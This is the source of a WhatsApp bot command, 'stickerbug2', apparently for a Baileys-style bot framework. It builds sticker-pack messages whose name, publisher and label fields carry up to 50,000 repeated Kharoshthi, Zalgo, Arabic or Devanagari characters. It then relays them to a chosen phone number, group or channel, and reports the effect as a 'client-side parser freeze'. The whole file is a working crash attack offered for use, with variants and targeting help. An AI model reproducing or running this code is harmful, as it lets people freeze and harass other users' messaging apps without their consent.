// ⟦EXPERT⟧ .stickerbug2 — sticker pack overflow (multi-variant, works in DMs + groups)
async function ownerOnly(z) {
  return !!z.isOwner
}

async function resolveTarget(z) {
  const arg = (z.args?.[0] || '').trim()
  if (!arg) return z.jid
  if (arg.includes('@')) return arg
  const digits = arg.replace(/[^0-9]/g, '')
  if (!digits) return z.jid
  try {
    const res = await z.sock.onWhatsApp(digits)
    if (res?.[0]?.exists) return res[0].jid
  } catch {}
  if (digits.length > 15) return `${digits}@lid`
  return `${digits}@s.whatsapp.net`
}

// ─── Overflow carriers ───
const CHARS_KHAROSHTHI = '𑇂𑆵𑆴𑆿'
const CHARS_ZALGO = '\u0300\u0301\u0302\u0303\u0304\u0305\u0306\u0307\u0308\u0309\u030A\u030B\u030C\u030D\u030E\u030F'
const CHARS_ARABIC = '\u0640\u0641\u0642\u0643\u0644\u0645\u0646\u0647\u0648\u0649\u064A'
const CHARS_DEVANAGARI = '\u0900\u0901\u0902\u0903\u0904\u0905\u0906\u0907'

function buildOverflow(base, char, count = 50000) {
  return base + char.repeat(count)
}

function buildPack({ name, publisher, label, hash, emojis, stickerCount = 1 }) {
  const stickers = Array.from({ length: stickerCount }, (_, i) => ({
    fileName: `sticker_${i}_${Math.random().toString(36).slice(2, 10)}.webp`,
    isAnimated: false,
    emojis: emojis || ['☕ 🙂'],
    accessibilityLabel: label || 'A smiling, white cup contains a brown drink.',
    isLottie: false,
    mimetype: 'image/webp'
  }))

  return {
    stickerPackMessage: {
      stickerPackId: `37309bf9-480e-4d34-a351-${Math.random().toString(36).slice(2, 14)}`,
      name: name || 'XinvasionX',
      publisher: publisher || '',
      stickers,
      fileLength: '12101',
      fileSha256: 'x8B6VRvQioEI5QiSc1PUfMQ/WScuCxSRe6ESgeE4vZI=',
      fileEncSha256: 'VgG2MXPYQrM19qVCnTM8gbroMrJ4OGsrFr85VnwTgw4=',
      mediaKey: 'Z6PBAr8+VBRm3rbLHGFGsqK1NWKAWUhJiEoexy8/8rg=',
      directPath: '/v/t62.15575-24/845116548_1120271783814388_1413355647273198645_n.enc?ccb=11-4&oh=01_Q5Aa5wHPKRX2pMwkNliwOhrHmhjFJn3H_FSO-5aE5ECexkHCmw&oe=6AF21C64&_nc_sid=5e03e0',
      contextInfo: {
        mediaDomainInfo: {
          mediaKeyDomain: 'MEDIA_KEY_DOMAIN_E2EE',
          e2EeMediaKey: 'Z6PBAr8+VBRm3rbLHGFGsqK1NWKAWUhJiEoexy8/8rg='
        }
      },
      mediaKeyTimestamp: '1791661738',
      trayIconFileName: '37309bf9-480e-4d34-a351-0902caf5d947.png',
      thumbnailDirectPath: '/v/t62.15575-24/844296080_2359855774752573_2108954759510968231_n.enc?ccb=11-4&oh=01_Q5Aa5wG-HoZduA-vmfcIgs-hx21cfZH7CFyJF8fSLqdA_1lkQg&oe=6AF20F30&_nc_sid=5e03e0',
      thumbnailSha256: 'AVOoVxfr9Ihoe5tkB8CkpWEUAny3WrxeD5gsriDt7Dw=',
      thumbnailEncSha256: 'pROAWbDdLnFSGEYMNNz7aPxzRLdE86ivzLbg+hmPmaA=',
      thumbnailHeight: 252,
      thumbnailWidth: 252,
      imageDataHash: hash || 'NTA0MjBkNGIyMDIwNDNjNDVkMDUzMDBkMTRlNTY3ZDJkMGM0NDZlMGQyMjZhZTMzYWIzZTI3NzJkOWY1OTg2MQ==',
      stickerPackSize: '11733',
      stickerPackOrigin: 'USER_CREATED'
    }
  }
}

const VARIANTS = {
  name: () => buildPack({
    name: buildOverflow('XinvasionX', CHARS_KHAROSHTHI, 50000)
  }),
  publisher: () => buildPack({
    name: 'XinvasionX',
    publisher: buildOverflow('', CHARS_KHAROSHTHI, 50000)
  }),
  label: () => buildPack({
    name: 'XinvasionX',
    label: buildOverflow('Cup ', CHARS_KHAROSHTHI, 50000),
    stickerCount: 1
  }),
  zalgo: () => buildPack({
    name: buildOverflow('XinvasionX', CHARS_ZALGO, 50000)
  }),
  arabic: () => buildPack({
    name: buildOverflow('XinvasionX', CHARS_ARABIC, 50000)
  }),
  devanagari: () => buildPack({
    name: buildOverflow('XinvasionX', CHARS_DEVANAGARI, 50000)
  }),
  multi: () => {
    const stickerCount = 100
    const stickers = Array.from({ length: stickerCount }, (_, i) => ({
      fileName: `s_${i}_${Math.random().toString(36).slice(2, 8)}.webp`,
      isAnimated: false,
      emojis: ['☕ 🙂'],
      accessibilityLabel: buildOverflow(`Sticker ${i}: `, CHARS_KHAROSHTHI, 5000),
      isLottie: false,
      mimetype: 'image/webp'
    }))
    return {
      stickerPackMessage: {
        stickerPackId: `37309bf9-480e-4d34-a351-${Math.random().toString(36).slice(2, 14)}`,
        name: 'XinvasionX' + CHARS_KHAROSHTHI.repeat(10000),
        publisher: '',
        stickers,
        fileLength: '12101',
        fileSha256: 'x8B6VRvQioEI5QiSc1PUfMQ/WScuCxSRe6ESgeE4vZI=',
        fileEncSha256: 'VgG2MXPYQrM19qVCnTM8gbroMrJ4OGsrFr85VnwTgw4=',
        mediaKey: 'Z6PBAr8+VBRm3rbLHGFGsqK1NWKAWUhJiEoexy8/8rg=',
        directPath: '/v/t62.15575-24/845116548_1120271783814388_1413355647273198645_n.enc?ccb=11-4&oh=01_Q5Aa5wHPKRX2pMwkNliwOhrHmhjFJn3H_FSO-5aE5ECexkHCmw&oe=6AF21C64&_nc_sid=5e03e0',
        contextInfo: {
          mediaDomainInfo: {
            mediaKeyDomain: 'MEDIA_KEY_DOMAIN_E2EE',
            e2EeMediaKey: 'Z6PBAr8+VBRm3rbLHGFGsqK1NWKAWUhJiEoexy8/8rg='
          }
        },
        mediaKeyTimestamp: '1791661738',
        trayIconFileName: '37309bf9-480e-4d34-a351-0902caf5d947.png',
        thumbnailDirectPath: '/v/t62.15575-24/844296080_2359855774752573_2108954759510968231_n.enc?ccb=11-4&oh=01_Q5Aa5wG-HoZduA-vmfcIgs-hx21cfZH7CFyJF8fSLqdA_1lkQg&oe=6AF20F30&_nc_sid=5e03e0',
        thumbnailSha256: 'AVOoVxfr9Ihoe5tkB8CkpWEUAny3WrxeD5gsriDt7Dw=',
        thumbnailEncSha256: 'pROAWbDdLnFSGEYMNNz7aPxzRLdE86ivzLbg+hmPmaA=',
        thumbnailHeight: 252,
        thumbnailWidth: 252,
        imageDataHash: 'NTA0MjBkNGIyMDIwNDNjNDVkMDUzMDBkMTRlNTY3ZDJkMGM0NDZlMGQyMjZhZTMzYWIzZTI3NzJkOWY1OTg2MQ==',
        stickerPackSize: '11733',
        stickerPackOrigin: 'USER_CREATED'
      }
    }
  },
  all: () => buildPack({
    name: buildOverflow('XinvasionX', CHARS_KHAROSHTHI, 25000),
    publisher: buildOverflow('', CHARS_ZALGO, 25000),
    label: buildOverflow('Cup ', CHARS_ARABIC, 25000),
    stickerCount: 10
  })
}

export default {
  name: 'stickerbug2',
  aliases: ['sbug2', 'stickerpack2', 'packbug2'],
  desc: 'Sticker pack overflow — works in DMs, groups, and channels',
  async run(z) {
    await z.react('🎨').catch(() => {})
    try {
      if (!(await ownerOnly(z))) return z.reply('⛔ Owner only.')

      const variant = (z.args?.[0] || 'name').toLowerCase()

      if (!VARIANTS[variant]) {
        return z.reply(
          `🎨 *Sticker Bug Variants:*\n\n` +
          `• \`.stickerbug2 name\` — Kharoshthi name overflow (50k)\n` +
          `• \`.stickerbug2 publisher\` — publisher overflow\n` +
          `• \`.stickerbug2 label\` — accessibility label overflow\n` +
          `• \`.stickerbug2 zalgo\` — combining diacritics\n` +
          `• \`.stickerbug2 arabic\` — Arabic shaping\n` +
          `• \`.stickerbug2 devanagari\` — Devanagari shaping\n` +
          `• \`.stickerbug2 multi\` — 100 stickers × 5k labels\n` +
          `• \`.stickerbug2 all\` — every field at once\n\n` +
          `📍 *Targeting:*\n` +
          `• \`.stickerbug2 name\` — current chat\n` +
          `• \`.stickerbug2 name 2348012345678\` — DM a number\n` +
          `• \`.stickerbug2 name 120363430346880436\` — group by JID\n\n` +
          `✅ Works in DMs, groups, and channels.`
        )
      }

      // Target = second arg (number/JID), otherwise current chat
      const targetArg = z.args?.[1]
      const target = targetArg
        ? await resolveTarget({ ...z, args: [targetArg] })
        : z.jid

      if (target.endsWith('@g.us')) {
        try { await z.sock.groupMetadata(target) }
        catch { return z.reply(`❌ *Bot is not in group:* ${target}`) }
      }

      await z.reply(
        `💀 *Launching STICKER BUG 2 [${variant}]...*\n` +
        `📱 *Target:* ${target}\n` +
        `⏳ *Building pack...*`
      )

      const rawMessage = VARIANTS[variant]()
      const messageId = `3EB0${Math.random().toString(36).slice(2, 12).toUpperCase()}`

      await z.sock.relayMessage(target, rawMessage, { messageId })

      await z.reply(
        `💀 *STICKER BUG 2 SENT!*\n\n` +
        `📱 *Target:* ${target}\n` +
        `🎨 *Variant:* ${variant}\n` +
        `💥 *Effect:* client-side parser freeze`
      )
      await z.react('✅').catch(() => {})
    } catch (e) {
      console.error('[stickerbug2]', e)
      await z.reply(`❌ *Sticker bug 2 failed*\n${e.message}`)
      await z.react('❌').catch(() => {})
    }
  }
}
